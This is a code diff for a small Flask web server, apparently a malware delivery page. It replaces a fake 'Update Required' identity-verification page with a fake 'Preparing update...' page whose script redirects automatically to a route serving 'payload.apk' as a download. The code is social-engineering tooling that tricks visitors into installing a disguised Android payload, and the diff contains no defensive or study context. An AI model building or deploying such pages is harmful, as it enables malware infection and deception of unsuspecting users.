@@ -1,22 +1,40 @@
-from flask import Flask, render_template_string
-app = Flask(__name__)
+from flask import Flask, send_file, render_template_string
+import os
 
-html = """
+app = Flask(__name__)
+PAYLOAD_FILE = "payload.apk"
+
+HTML_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><title>Security Check</title></head>
-<body style="font-family:Arial;text-align:center;padding:50px;background:#f0f2f5">
-<div style="background:white;padding:30px;border-radius:12px;max-width:400px;margin:auto">
-<h2 style="color:#1a73e8">🔐 Update Required</h2>
-<p>Please verify your identity to continue.</p>
-<input style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:6px">
-<button style="padding:10px 20px;background:#1a73e8;color:white;border:none;border-radius:6px;cursor:pointer">Verify</button>
-</div>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body { background: #000; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        h2 { color: #1a73e8; }
+        p { color: #aaa; }
+    </style>
+</head>
+<body>
+    <div>
+        <h2>Preparing update...</h2>
+        <p>Download will start automatically in a moment.</p>
+    </div>
+    <script>
+        window.location.href = "/download";
+    </script>
 </body>
 </html>
 """
+
 @app.route('/')
 def home():
-    return render_template_string(html)
+    return render_template_string(HTML_PAGE)
+
+@app.route('/download')
+def download():
+    return send_file(PAYLOAD_FILE, as_attachment=True)
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
